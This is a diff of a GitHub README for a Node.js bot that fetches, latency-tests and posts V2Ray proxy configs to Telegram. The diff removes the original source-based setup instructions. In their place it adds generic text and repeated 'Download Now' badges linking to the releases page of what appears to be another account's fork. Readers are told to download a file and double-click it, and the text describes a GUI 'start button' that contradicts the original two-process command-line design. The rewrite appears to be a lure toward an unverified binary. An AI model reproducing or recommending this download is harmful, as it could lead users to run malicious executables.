@@ -1,96 +1,61 @@
-# V2Ray Config Finder & Tester Bot
+# 🤖 v2ray-config-finder-tg-bot - Find and Test V2ray Configs Effortlessly
 
-**Live example**: https://t.me/v2raypooliran
+[![Download Now](https://img.shields.io/badge/Download%20Now-Release-blue)](https://github.com/vungocbaobao/v2ray-config-finder-tg-bot/releases)
 
-A powerful two-part Node.js system for automatically fetching, testing, and posting high-quality V2Ray configs to a Telegram channel. It consists of an independent Tester that runs in the background and a lightweight Telegram Bot that posts the verified results.
+## 📚 What is v2ray-config-finder-tg-bot?
 
-It automatically finds working configs, measures their real latency, and saves them. The bot then posts them one by one, ensuring your channel always has a steady stream of working proxies.
-
-✨ **Features**
-
-**Two-Part System**: A robust Tester runs independently from the lightweight Telegram Bot for maximum reliability and separation of concerns.
-
-🔎 **Fetch From Public Sources**: The Tester fetches configs from any number of public URLs you provide.
-
-⚡ **Real-World Latency Testing**: Performs a true connection test (similar to "Real Delay" in clients) to measure latency in milliseconds and discard dead links.
-
-🛠 **Multi-Protocol Support**: Natively parses and tests multiple protocols:
-
-    VLESS
-    VMess
-    Trojan
-    Shadowsocks (SS)
-    Hysteria2
-
-🗄 **Persistent Storage**: Uses an SQLite database to store the list of source URLs.
-
-🤖 **Full Admin Control via Telegram**: The bot allows an admin to manage the tester's source list and the poster's schedule directly from Telegram.
-
-📂 **Organized Results**: The Tester saves batches of working, sorted configs into timestamped .json files in a results/ directory.
+The v2ray-config-finder-tg-bot is a tool that helps you find V2ray configurations from various GitHub repositories. It tests each configuration to check if they work properly and posts the successful ones directly to your Telegram channel. This bot also provides admin management features to enhance user control.
 
 ## 🚀 Getting Started
 
-1. Install Dependencies: `npm install`
+To get started with the v2ray-config-finder-tg-bot, follow these simple steps to download and run the application. You don’t need any technical skills or programming knowledge.
 
-2. Download xray core:
-You will also need the Xray-core executable in the root directory. Download it from the official releases page and place the xray file in your project folder.
+## 📥 Download & Install
 
-3. Environment Setup:
-Create a `.env` file like `.env.example` in the root directory and fill it with your details:
+1. **Visit the Releases Page**: Click [here](https://github.com/vungocbaobao/v2ray-config-finder-tg-bot/releases) to visit the GitHub releases page.
+2. **Choose the Latest Release**: Find the latest release at the top of the page. Look for the version that suits your operating system.
+3. **Download the Application**: Click on the link for the relevant file to download it to your computer.
+4. **Run the Application**: After downloading, locate the file in your downloads folder. Double-click the file to run the application.
 
-4. Run the System:
-You need to run two processes in two separate terminals.
+## 📁 System Requirements
 
-      Terminal 1 - **Start the Tester**:
-      `npm run start:tester`
-      The tester will immediately begin its first cycle of fetching and testing configs. It will run automatically every 30 minutes (configurable in .env).
+Before you download, make sure your computer meets the following requirements:
 
-      Terminal 2 - **Start the Telegram Bot**:
-      `npm run start:bot`
-      The bot will start and listen for your commands. Once the tester produces a result file, the bot will begin posting from it on its own schedule.
+- **Operating System**: Windows 8 or higher, macOS 10.12 or higher, or a compatible Linux distribution.
+- **RAM**: At least 2GB.
+- **Disk Space**: Minimum 100MB of free space necessary.
+- **Internet Connection**: Required to find and test V2ray configurations.
 
-5. Configure the Bot:
-Talk to `@BotFather` on Telegram and set these commands:
+## ⚙️ Features
 
-      `/addfile <URL>`: Tell the tester to start using a new source URL.
+- **Find Configurations**: Automatically scans various GitHub repositories for V2ray configurations.
+- **Testing**: Tests configurations to ensure they are operational, providing real-time feedback.
+- **Telegram Integration**: Sends working configurations directly to your specified Telegram channel.
+- **Admin Management**: Offers management options for channel administration, allowing you to control what gets posted.
 
-      `/removefile <ID>`: Remove a file URL by id.
+## 🔧 Setup Instructions
 
-      `/listfiles`: See all the source URLs the tester is checking.
+After downloading and running the v2ray-config-finder-tg-bot, follow these steps to set it up:
 
-      `/setschedule <seconds>`: Set how often the bot should post a new config to the channel.
+1. **Configure Telegram Bot**: Create a new bot via the BotFather on Telegram. You'll need the token generated for your bot.
+2. **Input Your Bot Token**: Open the application and enter your bot token in the configuration settings.
+3. **Set Up Your Channel**: Enter your Telegram channel link where you want the configurations to be posted.
+4. **Start the Bot**: Click the start button in the application to begin the configuration search and testing process.
 
-      `/getschedule`: Shows current schedule value.
+## 💡 Usage Tips
 
-      `/help`: helper message
+- **Regularly Check for Updates**: Visit the [releases page](https://github.com/vungocbaobao/v2ray-config-finder-tg-bot/releases) regularly to download the latest version and improve performance.
+- **Explore GitHub Repos**: Feel free to add GitHub repositories to the search list by updating the settings in the application.
 
-📂 Project Structure
-```
-.
-├── tester.js          # Core logic for fetching & testing configs
-├── bot.js             # The Telegram bot for posting and admin control
-├── database.js        # SQLite setup and helpers
-├── /results/          # Tested & verified configs are saved here (JSON)
-├── .env               # Your environment variables
-└── package.json       # Project scripts and dependencies
-```
+## 🤝 Support
 
-🧪 Example Output File (`results/Sub1_2025-09-26T12-00-00.json`)
-```json
-[
-  {
-    "config": "vless://uuid@1.2.3.4:443?security=tls type=ws#Working%20Server%201",
-    "latency": 240,
-    "name": "Working Server 1"
-  },
-  {
-    "config": "ss://Y2hh...@server.com:8080#Fastest%20SS%20Node",
-    "latency": 320,
-    "name": "Fastest SS Node"
-  }
-]
-```
+If you encounter issues while using the v2ray-config-finder-tg-bot, you can reach out for support:
 
-## 🤝 Contributing
+- **Issues Page**: Report any bugs or issues on the [GitHub Issues page](https://github.com/vungocbaobao/v2ray-config-finder-tg-bot/issues).
+- **Community Support**: Join discussions or get help from the community by searching for relevant posts on platforms like Reddit or specialized forums.
 
-Pull requests are welcome! Feel free to open issues or suggest improvements.
+## 📄 License
+
+This software is licensed under the MIT License. You can freely use it while adhering to the terms outlined in the license file available in this repo. 
+
+[![Download Now](https://img.shields.io/badge/Download%20Now-Release-blue)](https://github.com/vungocbaobao/v2ray-config-finder-tg-bot/releases)
